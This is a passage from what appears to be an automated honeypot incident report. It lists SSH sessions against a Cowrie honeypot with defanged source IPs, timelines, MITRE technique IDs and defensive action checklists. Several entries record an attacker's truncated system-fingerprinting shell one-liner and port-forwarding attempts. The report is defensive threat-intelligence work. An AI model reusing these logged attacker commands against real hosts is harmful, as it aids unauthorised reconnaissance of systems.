| `2026-08-01 22:22:05` | `cowrie.client.version` |
| `2026-08-01 22:22:05` | `cowrie.client.kex` |
| `2026-08-01 22:22:07` | `cowrie.login.success` |
| `2026-08-01 22:22:09` | `cowrie.session.params` |
| `2026-08-01 22:22:09` | `cowrie.command.input` |
| `2026-08-01 22:22:09` | `cowrie.command.input` |
| `2026-08-01 22:22:09` | `cowrie.command.input` |
| `2026-08-01 22:22:09` | `cowrie.command.input` |
| `2026-08-01 22:22:09` | `cowrie.command.input` |
| `2026-08-01 22:22:09` | `cowrie.command.success` |
| `2026-08-01 22:22:09` | `cowrie.command.input` |
| `2026-08-01 22:22:09` | `cowrie.command.input` |
| `2026-08-01 22:22:09` | `cowrie.command.input` |
| `2026-08-01 22:22:09` | `cowrie.command.input` |
| `2026-08-01 22:22:09` | `cowrie.log.closed` |
| `2026-08-01 22:22:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7a9d26447c0

| Field | Detail |
|---|---|
| **Source IP** | `65.20.198[.]159` |
| **First Seen** | 2026-08-01 22:24 |
| **Last Seen** | 2026-08-01 22:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:24:22` | `cowrie.session.connect` |
| `2026-08-01 22:24:22` | `cowrie.client.version` |
| `2026-08-01 22:24:22` | `cowrie.client.kex` |
| `2026-08-01 22:24:24` | `cowrie.login.success` |
| `2026-08-01 22:24:24` | `cowrie.direct-tcpip.request` |
| `2026-08-01 22:24:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.198[.]159` to AbuseIPDB if not already reported
- [ ] Block `65.20.198[.]159` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcf47fa4c4e3

| Field | Detail |
|---|---|
| **Source IP** | `179.184.85[.]167` |
| **First Seen** | 2026-08-01 22:24 |
| **Last Seen** | 2026-08-01 22:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:24:29` | `cowrie.session.connect` |
| `2026-08-01 22:24:30` | `cowrie.client.version` |
| `2026-08-01 22:24:30` | `cowrie.client.kex` |
| `2026-08-01 22:24:32` | `cowrie.login.success` |
| `2026-08-01 22:24:33` | `cowrie.direct-tcpip.request` |
| `2026-08-01 22:24:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.85[.]167` to AbuseIPDB if not already reported
- [ ] Block `179.184.85[.]167` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b220112f62e1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-01 22:24 |
| **Last Seen** | 2026-08-01 22:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:24:31` | `cowrie.session.connect` |
| `2026-08-01 22:24:31` | `cowrie.client.version` |
| `2026-08-01 22:24:31` | `cowrie.client.kex` |
| `2026-08-01 22:24:32` | `cowrie.login.success` |
| `2026-08-01 22:24:33` | `cowrie.session.params` |
| `2026-08-01 22:24:33` | `cowrie.command.input` |
| `2026-08-01 22:24:33` | `cowrie.command.input` |
| `2026-08-01 22:24:33` | `cowrie.command.input` |
| `2026-08-01 22:24:33` | `cowrie.command.input` |
| `2026-08-01 22:24:33` | `cowrie.command.input` |
| `2026-08-01 22:24:33` | `cowrie.command.success` |
| `2026-08-01 22:24:33` | `cowrie.command.input` |
| `2026-08-01 22:24:33` | `cowrie.command.input` |
| `2026-08-01 22:24:33` | `cowrie.command.input` |
| `2026-08-01 22:24:33` | `cowrie.command.input` |
| `2026-08-01 22:24:34` | `cowrie.log.closed` |
| `2026-08-01 22:24:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-748c599604b2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-01 22:27 |
| **Last Seen** | 2026-08-01 22:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:27:11` | `cowrie.session.connect` |
| `2026-08-01 22:27:11` | `cowrie.client.version` |
| `2026-08-01 22:27:11` | `cowrie.client.kex` |
| `2026-08-01 22:27:11` | `cowrie.login.success` |
| `2026-08-01 22:27:12` | `cowrie.session.params` |
| `2026-08-01 22:27:12` | `cowrie.command.input` |
| `2026-08-01 22:27:12` | `cowrie.command.input` |
| `2026-08-01 22:27:12` | `cowrie.command.input` |
| `2026-08-01 22:27:12` | `cowrie.command.input` |
| `2026-08-01 22:27:12` | `cowrie.command.input` |
| `2026-08-01 22:27:12` | `cowrie.command.success` |
| `2026-08-01 22:27:12` | `cowrie.command.input` |
| `2026-08-01 22:27:12` | `cowrie.command.input` |
| `2026-08-01 22:27:12` | `cowrie.command.input` |
| `2026-08-01 22:27:12` | `cowrie.command.input` |
| `2026-08-01 22:27:13` | `cowrie.log.closed` |
| `2026-08-01 22:27:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d35280ad607

| Field | Detail |
|---|---|
| **Source IP** | `163.192.48[.]255` |
| **First Seen** | 2026-08-01 22:27 |
| **Last Seen** | 2026-08-01 22:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:27:54` | `cowrie.session.connect` |
| `2026-08-01 22:27:54` | `cowrie.client.version` |
| `2026-08-01 22:27:54` | `cowrie.client.kex` |
| `2026-08-01 22:27:55` | `cowrie.login.success` |
| `2026-08-01 22:27:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.192.48[.]255` to AbuseIPDB if not already reported
- [ ] Block `163.192.48[.]255` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2b9f2349240

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-01 22:30 |
| **Last Seen** | 2026-08-01 22:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:30:07` | `cowrie.session.connect` |
| `2026-08-01 22:30:07` | `cowrie.client.version` |
| `2026-08-01 22:30:07` | `cowrie.client.kex` |
| `2026-08-01 22:30:08` | `cowrie.login.success` |
| `2026-08-01 22:30:09` | `cowrie.session.params` |
| `2026-08-01 22:30:09` | `cowrie.command.input` |
| `2026-08-01 22:30:09` | `cowrie.command.input` |
| `2026-08-01 22:30:09` | `cowrie.command.input` |
| `2026-08-01 22:30:09` | `cowrie.command.input` |
| `2026-08-01 22:30:09` | `cowrie.command.input` |
| `2026-08-01 22:30:09` | `cowrie.command.success` |
| `2026-08-01 22:30:09` | `cowrie.command.input` |
| `2026-08-01 22:30:09` | `cowrie.command.input` |
| `2026-08-01 22:30:09` | `cowrie.command.input` |
| `2026-08-01 22:30:09` | `cowrie.command.input` |
| `2026-08-01 22:30:09` | `cowrie.log.closed` |
| `2026-08-01 22:30:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-630e008bb893

| Field | Detail |
|---|---|
| **Source IP** | `223.100.248[.]64` |
| **First Seen** | 2026-08-01 22:32 |
| **Last Seen** | 2026-08-01 22:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:32:34` | `cowrie.session.connect` |
| `2026-08-01 22:32:34` | `cowrie.client.version` |
| `2026-08-01 22:32:34` | `cowrie.client.kex` |
| `2026-08-01 22:32:36` | `cowrie.login.success` |
| `2026-08-01 22:32:37` | `cowrie.direct-tcpip.request` |
| `2026-08-01 22:32:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.100.248[.]64` to AbuseIPDB if not already reported
- [ ] Block `223.100.248[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d1b4c5f613a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-01 22:32 |
| **Last Seen** | 2026-08-01 22:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:32:38` | `cowrie.session.connect` |
| `2026-08-01 22:32:38` | `cowrie.client.version` |
| `2026-08-01 22:32:38` | `cowrie.client.kex` |
| `2026-08-01 22:32:39` | `cowrie.login.success` |
| `2026-08-01 22:32:41` | `cowrie.session.params` |
| `2026-08-01 22:32:41` | `cowrie.command.input` |
| `2026-08-01 22:32:41` | `cowrie.command.input` |
| `2026-08-01 22:32:41` | `cowrie.command.input` |
| `2026-08-01 22:32:41` | `cowrie.command.input` |
| `2026-08-01 22:32:41` | `cowrie.command.input` |
| `2026-08-01 22:32:41` | `cowrie.command.success` |
| `2026-08-01 22:32:41` | `cowrie.command.input` |
| `2026-08-01 22:32:41` | `cowrie.command.input` |
| `2026-08-01 22:32:41` | `cowrie.command.input` |
| `2026-08-01 22:32:41` | `cowrie.command.input` |
| `2026-08-01 22:32:41` | `cowrie.log.closed` |
| `2026-08-01 22:32:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ee71a0780df

| Field | Detail |
|---|---|
| **Source IP** | `14.97.77[.]182` |
| **First Seen** | 2026-08-01 22:32 |
| **Last Seen** | 2026-08-01 22:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:32:42` | `cowrie.session.connect` |
| `2026-08-01 22:32:43` | `cowrie.client.version` |
| `2026-08-01 22:32:43` | `cowrie.client.kex` |
| `2026-08-01 22:32:44` | `cowrie.login.success` |
| `2026-08-01 22:32:45` | `cowrie.direct-tcpip.request` |
| `2026-08-01 22:32:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.97.77[.]182` to AbuseIPDB if not already reported
- [ ] Block `14.97.77[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0faa8ccc5ea

| Field | Detail |
|---|---|
| **Source IP** | `93.177.157[.]179` |
| **First Seen** | 2026-08-01 22:32 |
| **Last Seen** | 2026-08-01 22:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:32:47` | `cowrie.session.connect` |
| `2026-08-01 22:32:47` | `cowrie.client.version` |
| `2026-08-01 22:32:47` | `cowrie.client.kex` |
| `2026-08-01 22:32:49` | `cowrie.login.success` |
| `2026-08-01 22:32:49` | `cowrie.direct-tcpip.request` |
| `2026-08-01 22:32:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.177.157[.]179` to AbuseIPDB if not already reported
- [ ] Block `93.177.157[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c0d13a77baf

| Field | Detail |
|---|---|
| **Source IP** | `34.146.248[.]7` |
| **First Seen** | 2026-08-01 22:32 |
| **Last Seen** | 2026-08-01 22:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:32:54` | `cowrie.session.connect` |
| `2026-08-01 22:32:55` | `cowrie.client.version` |
| `2026-08-01 22:32:55` | `cowrie.client.kex` |
| `2026-08-01 22:32:57` | `cowrie.login.success` |
| `2026-08-01 22:32:57` | `cowrie.direct-tcpip.request` |
| `2026-08-01 22:33:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.146.248[.]7` to AbuseIPDB if not already reported
- [ ] Block `34.146.248[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb8b112b48fe

| Field | Detail |
|---|---|
| **Source IP** | `182.156.80[.]11` |
| **First Seen** | 2026-08-01 22:33 |
| **Last Seen** | 2026-08-01 22:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:33:42` | `cowrie.session.connect` |
| `2026-08-01 22:33:42` | `cowrie.client.version` |
| `2026-08-01 22:33:42` | `cowrie.client.kex` |
| `2026-08-01 22:33:44` | `cowrie.login.success` |
| `2026-08-01 22:33:45` | `cowrie.direct-tcpip.request` |
| `2026-08-01 22:33:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.156.80[.]11` to AbuseIPDB if not already reported
- [ ] Block `182.156.80[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73435bdd92ad

| Field | Detail |
|---|---|
| **Source IP** | `64.53.7[.]231` |
| **First Seen** | 2026-08-01 22:33 |
| **Last Seen** | 2026-08-01 22:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:33:49` | `cowrie.session.connect` |
| `2026-08-01 22:33:50` | `cowrie.client.version` |
| `2026-08-01 22:33:50` | `cowrie.client.kex` |
| `2026-08-01 22:33:51` | `cowrie.login.success` |
| `2026-08-01 22:33:51` | `cowrie.direct-tcpip.request` |
| `2026-08-01 22:33:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.53.7[.]231` to AbuseIPDB if not already reported
- [ ] Block `64.53.7[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9a553d088f8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-01 22:35 |
| **Last Seen** | 2026-08-01 22:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:35:11` | `cowrie.session.connect` |
| `2026-08-01 22:35:12` | `cowrie.client.version` |
| `2026-08-01 22:35:12` | `cowrie.client.kex` |
| `2026-08-01 22:35:13` | `cowrie.login.success` |
| `2026-08-01 22:35:14` | `cowrie.session.params` |
| `2026-08-01 22:35:14` | `cowrie.command.input` |
| `2026-08-01 22:35:14` | `cowrie.command.input` |
| `2026-08-01 22:35:14` | `cowrie.command.input` |
| `2026-08-01 22:35:14` | `cowrie.command.input` |
| `2026-08-01 22:35:14` | `cowrie.command.input` |
| `2026-08-01 22:35:14` | `cowrie.command.success` |
| `2026-08-01 22:35:14` | `cowrie.command.input` |
| `2026-08-01 22:35:14` | `cowrie.command.input` |
| `2026-08-01 22:35:14` | `cowrie.command.input` |
| `2026-08-01 22:35:14` | `cowrie.command.input` |
| `2026-08-01 22:35:15` | `cowrie.log.closed` |
| `2026-08-01 22:35:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a6c9244e8cf

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-01 22:37 |
| **Last Seen** | 2026-08-01 22:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:37:35` | `cowrie.session.connect` |
| `2026-08-01 22:37:35` | `cowrie.client.version` |
| `2026-08-01 22:37:35` | `cowrie.client.kex` |
| `2026-08-01 22:37:36` | `cowrie.login.success` |
| `2026-08-01 22:37:38` | `cowrie.session.params` |
| `2026-08-01 22:37:38` | `cowrie.command.input` |
| `2026-08-01 22:37:38` | `cowrie.command.input` |
| `2026-08-01 22:37:38` | `cowrie.command.input` |
| `2026-08-01 22:37:38` | `cowrie.command.input` |
| `2026-08-01 22:37:38` | `cowrie.command.input` |
| `2026-08-01 22:37:38` | `cowrie.command.success` |
| `2026-08-01 22:37:38` | `cowrie.command.input` |
| `2026-08-01 22:37:38` | `cowrie.command.input` |
| `2026-08-01 22:37:38` | `cowrie.command.input` |
| `2026-08-01 22:37:38` | `cowrie.command.input` |
| `2026-08-01 22:37:38` | `cowrie.log.closed` |
| `2026-08-01 22:37:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17d11e1177a0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-01 22:39 |
| **Last Seen** | 2026-08-01 22:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:39:58` | `cowrie.session.connect` |
| `2026-08-01 22:39:58` | `cowrie.client.version` |
| `2026-08-01 22:39:58` | `cowrie.client.kex` |
| `2026-08-01 22:40:00` | `cowrie.login.success` |
| `2026-08-01 22:40:01` | `cowrie.session.params` |
| `2026-08-01 22:40:01` | `cowrie.command.input` |
| `2026-08-01 22:40:01` | `cowrie.command.input` |
| `2026-08-01 22:40:01` | `cowrie.command.input` |
| `2026-08-01 22:40:01` | `cowrie.command.input` |
| `2026-08-01 22:40:01` | `cowrie.command.input` |
| `2026-08-01 22:40:01` | `cowrie.command.success` |
| `2026-08-01 22:40:01` | `cowrie.command.input` |
| `2026-08-01 22:40:01` | `cowrie.command.input` |
| `2026-08-01 22:40:01` | `cowrie.command.input` |
| `2026-08-01 22:40:01` | `cowrie.command.input` |
| `2026-08-01 22:40:01` | `cowrie.log.closed` |
| `2026-08-01 22:40:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20ff7a8fbcd7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-01 22:42 |
| **Last Seen** | 2026-08-01 22:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
